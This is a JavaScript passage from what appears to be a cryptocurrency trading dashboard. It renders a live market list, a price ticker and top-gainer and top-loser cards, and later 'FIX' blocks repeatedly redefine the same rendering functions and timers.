                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                    <span style="font-size: 12px; color: #fff; font-weight: bold;">${c.symbol}</span>
                    <span class="${colorClass}" style="font-size: 11px; font-weight: bold;">${arrow} ${Math.abs(c.change).toFixed(2)}%</span>
                </div>
                <div style="font-weight: bold; font-size: 13px; color: #888;">
                    $${formatPrice(c.price)}
                </div>
            </div>
        `;
    }).join('');
};

// Automatically trigger the render whenever the real prices are fetched or on load
setInterval(() => { if (typeof window.renderGainersLosers === 'function') window.renderGainersLosers(); }, 3000);
document.addEventListener('DOMContentLoaded', () => {
    /* ROGUE 1S TIMEOUT DISABLED */
});


/* =====================================================
   ULTIMATE BINANCE-STYLE GAINERS & LOSERS (Frontend Hijack)
   ===================================================== */
setInterval(() => {
    const container = document.getElementById('gainersLosersList');
    if (!container || typeof markets === 'undefined' || markets.length === 0) return;

    // 1. Separate and Sort the coins perfectly
    const validCoins = markets.filter(c => c && c.price > 0 && typeof c.change === 'number' && !isNaN(c.change));
    
    let gainers = validCoins.filter(c => c.change > 0).sort((a, b) => b.change - a.change).slice(0, 3); if (gainers.length === 0) { gainers = [...validCoins].sort((a, b) => b.change - a.change).slice(0, 3); }
    let losers = validCoins.filter(c => c.change < 0).sort((a, b) => a.change - b.change).slice(0, 3); if (losers.length === 0) { losers = [...validCoins].sort((a, b) => a.change - b.change).slice(0, 3); }

    // 2. Flawless Price Formatter (No more $0.00 for tiny coins)
    const formatPrice = (price) => {
        if (price >= 1000) return price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
        if (price >= 1) return price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 4});
        if (price >= 0.001) return price.toFixed(4);
        return price.toFixed(8); // For Pepe, Shib, etc.
    };

    // 3. Card Builder
    const buildCard = (c, isGainer) => {
        const color = isGainer ? '#0ecb51' : '#f6465d';
        const arrow = isGainer ? '↑' : '↓';
        return `
            <div class="gl-card" onclick="if(typeof quickTrade === 'function') quickTrade('${c.symbol}')" style="cursor: pointer; border-left: 3px solid ${color}; min-width: 110px;">
                <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                    <span style="font-size: 12px; color: #fff; font-weight: bold;">${c.symbol}</span>
                    <span style="font-size: 11px; color: ${color}; font-weight: bold;">${arrow} ${Math.abs(c.change).toFixed(2)}%</span>
                </div>
                <div style="font-weight: bold; font-size: 13px; color: #888;">
                    $${formatPrice(c.price)}
                </div>
            </div>
        `;
    };

    // 4. Inject the fully structured UI
    container.innerHTML = `
        <div style="display: flex; flex-direction: column; gap: 15px; width: 100%;">
            <!-- GAINERS ROW -->
            <div>
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                    <h3 style="font-size: 14px; color: #fff; margin: 0;">Top Gainers</h3>
                    <span style="font-size: 11px; color: #0ecb51;">● Live</span>
                </div>
                <div class="gainers-losers-row" style="display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none;">
                    ${gainers.map(c => buildCard(c, true)).join('')}
                </div>
            </div>

            <!-- LOSERS ROW -->
            <div>
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                    <h3 style="font-size: 14px; color: #fff; margin: 0;">Top Losers</h3>
                    <span style="font-size: 11px; color: #f6465d;">● Live</span>
                </div>
                <div class="gainers-losers-row" style="display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none;">
                    ${losers.map(c => buildCard(c, false)).join('')}
                </div>
            </div>
        </div>
    `;
}, 2000); // Runs every 2 seconds to stay perfectly synced

/* =====================================================
   FIX: STOP THE JUMPING & LOCK THE GAINERS/LOSERS
   ===================================================== */
// 1. Stop all previous market timers
if (window.marketInterval) clearInterval(window.marketInterval);
if (window.gainersInterval) clearInterval(window.gainersInterval);

// 2. Completely overwrite the loadMarkets function to include our dual-row layout
window.loadMarkets = function() {
    const marketList = document.getElementById('market-list'); 
    const ticker = document.getElementById('ticker');
    const glList = document.getElementById('gainersLosersList');
    
    if(!marketList) return;
    
    // --- PART A: RENDER THE MAIN LIVE MARKETS LIST ---
    let marketHTML = ''; 
    let tickerHTML = '';
    
    markets.forEach((coin, index) => {
        const isUp = coin.change >= 0; 
        const changeClass = isUp ? 'up' : 'down'; 
        const changeSymbol = isUp ? '↑' : '↓';
        
        let formattedPrice = coin.price >= 1 
            ? coin.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})
            : coin.price.toFixed(6);

        marketHTML += `
            <div class="market-row" onclick="quickTrade('${coin.symbol}')">
                <div class="market-rank">${index + 1}</div>
                <div class="market-name-col">
                    <div class="market-icon" style="background: ${coin.color || '#333'};">${coin.icon || coin.symbol.charAt(0)}</div>
                    <div>
                        <div class="market-name-text">${coin.name}</div>
                        <div class="market-symbol-text">${coin.symbol}</div>
                    </div>
                </div>
                <div class="market-price">$${formattedPrice}</div>
                <div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change).toFixed(2)}%</div>
            </div>`;
            
        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change).toFixed(2)}%</span></div>`;
    });
    
    marketList.innerHTML = marketHTML; 
    if(ticker) ticker.innerHTML = tickerHTML + tickerHTML; 

    // --- PART B: RENDER THE DUAL-ROW GAINERS & LOSERS ---
    if (glList && markets.length > 0) {
        // Filter and sort safely without modifying the original array
        const validCoins = markets.filter(c => c && c.price > 0 && typeof c.change === 'number');
        
        // Top 3 Gainers (Sort descending)
        let gainers = [...validCoins].filter(c => c.change > 0).sort((a, b) => b.change - a.change).slice(0, 3); if (gainers.length === 0) { gainers = [...validCoins].sort((a, b) => b.change - a.change).slice(0, 3); }
        
        // Top 3 Losers (Sort ascending)
        let losers = [...validCoins].filter(c => c.change < 0).sort((a, b) => a.change - b.change).slice(0, 3); if (losers.length === 0) { losers = [...validCoins].sort((a, b) => a.change - b.change).slice(0, 3); }

        const formatPrice = (price) => {
            if (price >= 1000) return price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
            if (price >= 1) return price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 4});
            if (price >= 0.001) return price.toFixed(4);
            return price.toFixed(8); 
        };

        const buildCard = (c, isGainer) => {
            const color = isGainer ? '#0ecb51' : '#f6465d';
            const arrow = isGainer ? '↑' : '↓';
            return `
                <div class="gl-card" onclick="if(typeof quickTrade === 'function') quickTrade('${c.symbol}')" style="cursor: pointer; border-left: 3px solid ${color}; min-width: 110px;">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                        <span style="font-size: 12px; color: #fff; font-weight: bold;">${c.symbol}</span>
                        <span style="font-size: 11px; color: ${color}; font-weight: bold;">${arrow} ${Math.abs(c.change).toFixed(2)}%</span>
                    </div>
                    <div style="font-weight: bold; font-size: 13px; color: #888;">
                        $${formatPrice(c.price)}
                    </div>
                </div>
            `;
        };

        glList.innerHTML = `
            <div style="display: flex; flex-direction: column; gap: 15px; width: 100%;">
                <div>
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                        <h3 style="font-size: 14px; color: #fff; margin: 0;">Top Gainers</h3>
                        <span style="font-size: 11px; color: #0ecb51;">● Live</span>
                    </div>
                    <div class="gainers-losers-row" style="display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none;">
                        ${gainers.length > 0 ? gainers.map(c => buildCard(c, true)).join('') : '<p style="color:#888;font-size:12px;">No gainers right now.</p>'}
                    </div>
                </div>
                <div>
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                        <h3 style="font-size: 14px; color: #fff; margin: 0;">Top Losers</h3>
                        <span style="font-size: 11px; color: #f6465d;">● Live</span>
                    </div>
                    <div class="gainers-losers-row" style="display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none;">
                        ${losers.length > 0 ? losers.map(c => buildCard(c, false)).join('') : '<p style="color:#888;font-size:12px;">No losers right now.</p>'}
                    </div>
                </div>
            </div>
        `;
    }
};

// 3. Restart the single, unified timer
window.marketInterval = setInterval(() => {
    const guestView = document.getElementById('guestView');
    if (guestView && guestView.style.display !== 'none') {
        if (typeof simulateLiveMarket === 'function') simulateLiveMarket();
        window.loadMarkets();
    }
}, 2000);

// 4. Trigger it immediately on load
window.loadMarkets();

/* =====================================================
   FIX V2: PREVENT LAYOUT COLLAPSE & FLASHING
   ===================================================== */
if (window.marketInterval) clearInterval(window.marketInterval);

window.loadMarkets = function() {
    const marketList = document.getElementById('market-list'); 
    const ticker = document.getElementById('ticker');
    const glList = document.getElementById('gainersLosersList');
    
    if(!marketList) return;
    
    // --- PART A: RENDER THE MAIN LIVE MARKETS LIST ---
    let marketHTML = ''; 
    let tickerHTML = '';
    
    markets.forEach((coin, index) => {
        const isUp = coin.change >= 0; 
        const changeClass = isUp ? 'up' : 'down'; 
        const changeSymbol = isUp ? '↑' : '↓';
        
        let formattedPrice = coin.price >= 1 
            ? coin.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})
            : coin.price.toFixed(6);

        marketHTML += `
            <div class="market-row" onclick="quickTrade('${coin.symbol}')">
                <div class="market-rank">${index + 1}</div>
                <div class="market-name-col">
                    <div class="market-icon" style="background: ${coin.color || '#333'};">${coin.icon || coin.symbol.charAt(0)}</div>
                    <div>
                        <div class="market-name-text">${coin.name}</div>
                        <div class="market-symbol-text">${coin.symbol}</div>
                    </div>
                </div>
                <div class="market-price">$${formattedPrice}</div>
                <div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change).toFixed(2)}%</div>
            </div>`;
            
        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change).toFixed(2)}%</span></div>`;
    });
    
    marketList.innerHTML = marketHTML; 
    if(ticker) ticker.innerHTML = tickerHTML + tickerHTML; 

    // --- PART B: RENDER THE DUAL-ROW GAINERS & LOSERS ---
    if (glList && markets.length > 0) {
        const validCoins = markets.filter(c => c && c.price > 0 && typeof c.change === 'number');
        
        // Sort everything descending
        const sortedDescending = [...validCoins].sort((a, b) => b.change - a.change);
        
        // Top 3 Gainers
        let gainers = sortedDescending.filter(c => c.change > 0).slice(0, 3);
        if (gainers.length === 0) gainers = sortedDescending.slice(0, 3); // Fallback if everything is red

        // Top 3 Losers
        let losers = [...validCoins].filter(c => c.change < 0).sort((a, b) => a.change - b.change).slice(0, 3);
        if (losers.length === 0) losers = sortedDescending.slice(-3).reverse(); // Fallback if everything is green

        const formatPrice = (price) => {
            if (price >= 1000) return price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
            if (price >= 1) return price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 4});
            if (price >= 0.001) return price.toFixed(4);
            return price.toFixed(8); 
        };

        const buildCard = (c, isGainer) => {
            // If the fallback triggers, the color matches the actual change (red/green)
            const isActuallyUp = c.change >= 0;
            const color = isActuallyUp ? '#0ecb51' : '#f6465d';
            const arrow = isActuallyUp ? '↑' : '↓';
            
            return `
                <div class="gl-card" onclick="if(typeof quickTrade === 'function') quickTrade('${c.symbol}')" style="cursor: pointer; border-left: 3px solid ${color}; min-width: 110px;">
                    <div style="display: flex; justify-content: space-between; margin-bottom: 4px;">
                        <span style="font-size: 12px; color: #fff; font-weight: bold;">${c.symbol}</span>
                        <span style="font-size: 11px; color: ${color}; font-weight: bold;">${arrow} ${Math.abs(c.change).toFixed(2)}%</span>
                    </div>
                    <div style="font-weight: bold; font-size: 13px; color: #888;">
                        $${formatPrice(c.price)}
                    </div>
                </div>
            `;
        };

        glList.innerHTML = `
            <div style="display: flex; flex-direction: column; gap: 15px; width: 100%;">
                <div>
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                        <h3 style="font-size: 14px; color: #fff; margin: 0;">Top Gainers</h3>
                        <span style="font-size: 11px; color: #0ecb51;">● Live</span>
                    </div>
                    <div class="gainers-losers-row" style="display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none; min-height: 60px;">
                        ${gainers.map(c => buildCard(c, c.change >= 0)).join('')}
                    </div>
                </div>
                <div>
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                        <h3 style="font-size: 14px; color: #fff; margin: 0;">Top Losers</h3>
                        <span style="font-size: 11px; color: #f6465d;">● Live</span>
                    </div>
                    <div class="gainers-losers-row" style="display: flex; gap: 10px; overflow-x: auto; padding-bottom: 5px; scrollbar-width: none; min-height: 60px;">
                        ${losers.map(c => buildCard(c, c.change >= 0)).join('')}
                    </div>
                </div>
            </div>
        `;
    }
};

/* disabled duplicate market interval */

window.loadMarkets();
